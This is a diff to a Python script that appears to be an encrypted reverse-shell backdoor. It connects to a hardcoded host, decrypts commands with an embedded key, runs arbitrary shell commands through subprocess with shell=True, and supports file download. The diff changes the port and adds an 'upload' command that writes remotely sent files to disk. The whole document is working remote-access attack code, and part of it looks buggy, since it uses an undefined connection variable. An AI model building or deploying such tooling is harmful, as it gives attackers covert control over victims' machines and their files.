@@ -5,7 +5,7 @@ import socket,subprocess
 import sys,os,time
 
 HOST = '192.168.1.11'   # Symbolic name, meaning all available interfaces
-PORT = 8888 # Arbitrary non-privileged port
+PORT = 8887 # Arbitrary non-privileged port
 
 # This must be kept secret, this is the combination to your safe
 key = '9SeT2kaxYlRYS675TxzHwB2el4Pa15A3'
@@ -50,6 +50,28 @@ while 1:
             s.sendall('EOFEOFEOFEOFEOFX')
             time.sleep(0.8)
             s.sendall(box.encrypt('Download is finished.EOFEOFEOFEOFEOFX'))
+
+    elif dataDec.startswith("upload") == True:
+            #set the name of the file
+            downFile = dataDec[7:]
+            d = open(downFile, 'wb')
+            #upload the daamn file
+            while True:
+                l = conn.recv(1024)
+                while (l):
+                    if(l.endswith("EOFEOFEOFEOFEOFX")):
+                        u = l[:-16]
+                        d.write(u)
+                        break
+                    else:
+                        d.write(l)
+                        l = conn.recv(1024)
+                break
+            d.close()
+            time.sleep(0.8)
+            s.sendall(box.encrypt('Upload is finished.EOFEOFEOFEOFEOFX'))
+
+
 
     else:
             proc = subprocess.Popen(dataDec, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
